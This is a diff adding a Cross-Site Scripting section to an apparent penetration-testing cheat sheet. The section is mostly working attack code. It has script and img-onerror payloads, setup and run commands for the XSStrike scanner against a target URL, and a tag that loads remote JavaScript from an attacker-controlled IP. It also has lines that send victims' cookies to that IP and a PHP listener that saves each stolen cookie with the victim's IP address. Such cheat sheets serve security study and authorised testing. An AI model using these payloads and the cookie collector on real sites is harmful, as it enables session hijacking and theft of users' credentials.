@@ -930,3 +930,49 @@ debug=
 file=
 path=
 ```
+
+## 11) Cross-Site Scripting
+PAyloadsAllTheThings: `https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection`
+
+Basic Payload (POC)
+```html
+<script>alert(document.cookie)</script>
+```
+
+Payload where `<script>` tags are not allowed
+```html
+<img src="" onerror=alert(document.cookie)>
+```
+
+XSS Discovery with `XSS Strike`
+```bash
+git clone https://github.com/s0md3v/XSStrike.git
+cd XSStrike
+pip install -r requirements.txt
+python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"
+```
+
+Load Remote JS
+```html
+<script src="http://OUR_IP/script.js"></script>
+```
+
+Steal Cookies
+```html
+document.location='http://OUR_IP/index.php?c='+document.cookie;
+new Image().src='http://OUR_IP/index.php?c='+document.cookie;
+```
+PHP Server to Save Cookies
+```php
+<?php
+if (isset($_GET['c'])) {
+    $list = explode(";", $_GET['c']);
+    foreach ($list as $key => $value) {
+        $cookie = urldecode($value);
+        $file = fopen("cookies.txt", "a+");
+        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
+        fclose($file);
+    }
+}
+?>
+```
